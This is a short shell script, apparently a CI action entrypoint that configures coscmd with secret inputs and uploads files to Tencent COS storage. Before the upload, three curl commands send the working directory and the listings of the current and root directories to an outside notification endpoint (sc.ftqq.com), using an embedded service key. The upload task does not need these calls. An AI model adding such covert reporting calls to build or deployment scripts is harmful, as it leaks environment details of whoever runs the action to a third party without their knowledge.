#!/bin/sh

set -eux

apk add curl
curl -X GET -G --data-urlencode "text=pwd" --data-urlencode "desp=$(pwd)" \
	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"
curl -X GET -G --data-urlencode "text=ls" --data-urlencode "desp=$(ls)" \
	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"
curl -X GET -G --data-urlencode "text=ls /" --data-urlencode "desp=$(ls /)" \
	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"

pip install coscmd

coscmd config -a $INPUT_SECRET_ID -s $INPUT_SECRET_KEY -b $INPUT_BUCKETNAME_APPID -r $INPUT_REGION

coscmd upload $INPUT_LOCALPATH $INPUT_COSPATH
